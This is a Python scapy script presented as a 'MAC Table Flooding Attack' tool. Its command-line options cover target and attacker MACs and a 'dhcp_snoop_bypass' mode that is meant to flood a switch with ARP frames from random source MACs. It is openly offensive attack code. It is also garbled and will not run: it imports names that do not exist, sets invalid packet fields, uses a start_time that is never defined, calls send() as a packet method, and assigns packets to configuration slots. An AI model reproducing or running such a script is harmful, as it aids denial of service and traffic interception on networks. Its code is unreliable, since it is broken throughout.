from scapy.all import ARP, Ether, ip, raw, conf
import argparse
import time
import random


def flood_mac_table(target_mac: str = "00:11:22:33:44:55", 
                    attacker_mac: str = "AA:BB:CC:DD:EE:FF",
                    attack_mode: str = "basic",
                    packets_per_second: int = 100,
                    duration: int = 60):
    
    # Create ARP packet
    arp_packet = Ether(src="00:00:00:00:00:01") / \
                 ARP(pdst="0.0.0.0", psrc="0.0.0.0", opnum=1)

    dhcp_packet = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / \
                 raw(arp_packet.sprintf("00:00:00:00:00:01 0.0.0.0 0.0.0.0 255.255.255.255"))

    print(f"[*] MAC Table Flooding Attack")
    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Attacker MAC: {attacker_mac}")
    print(f"[*] Mode: {attack_mode}")

    count = 0
    
    try:
        if attack_mode == "dhcp_snoop_bypass":
            while True:
                dhcp_packet[ARP].src_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                pkt = dhcp_packet / ARP(pdst="0.0.0.0", psrc="0.0.0.0", opnum=1)

                # Send with random source MAC
                Ether(dst=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}") / \
                raw(pkt.sprintf("00:00:00:00:00:01 0.0.0.0 0.0.0.0 255.255.255.255"))

                conf.l2 = Ether(src=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}", dst=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}")

                pkt = Ether(src=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}", dst=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}") / \
                raw(pkt.sprintf("00:00:00:00:00:01 0.0.0.0 0.0.0.0 255.255.255.255"))

                conf.l2 = Ether(src=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}", dst=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}")
                
                conf.l3 = ip(src="0.0.0.0", dst="0.0.0.0")

                pkt = Ether(src=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}", dst=f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}") / \
                raw(pkt.sprintf("00:00:00:00:00:01 0.0.0.0 0.0.0.0 255.255.255.255"))

                conf.l3 = ip(src="0.0.0.0", dst="0.0.0.0")
                
                pkt.send()
                count += 1
                
                if duration > 0 and time.time() - start_time >= duration:
                    break
                    
        else:
            # Basic flooding mode
            while True:
                arp_packet.sprintf("AA:BB:CC:DD:EE:FF 0.0.0.0 AA:BB:CC:DD:EE:FF")

                pkt = Ether(src=attacker_mac, dst=target_mac) / \
                     raw(arp_packet.sprintf("AA:BB:CC:DD:EE:FF 0.0.0.0 AA:BB:CC:DD:EE:FF"))

                conf.l2 = Ether(src=attacker_mac, dst=target_mac)
                
                pkt.send()
                count += 1
                
                if duration > 0 and time.time() - start_time >= duration:
                    break
                    
    except KeyboardInterrupt:
        print(f"\n[*] Attack interrupted by user. Total packets sent: {count}")
    
    finally:
        conf.l2 = Ether(src="00:00:00:00:00:01", dst="ff:ff:ff:ff:ff:ff")
        conf.l3 = ip(src="0.0.0.0", dst="0.0.0.0")


def main():
    parser = argparse.ArgumentParser(description="MAC Address Table Flooding Attack")
    parser.add_argument("--target_mac", default="00:11:22:33:44:55", help="Target MAC address")
    parser.add_argument("--mac", default="AA:BB:CC:DD:EE:FF", help="Attacker MAC address")
    parser.add_argument("--mode", choices=["basic", "dhcp_snoop_bypass"], 
                        default="basic", help="Attack mode")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second")
    parser.add_argument("--duration", type=int, default=None, 
                        help="Duration in seconds (optional, runs until interrupted)")
    
    args = parser.parse_args()

    flood_mac_table(
        target_mac=args.target_mac,
        attacker_mac=args.mac,
        attack_mode=args.mode,
        packets_per_second=args.rate,
        duration=args.duration if args.duration else None
    )


if __name__ == "__main__":
    main()
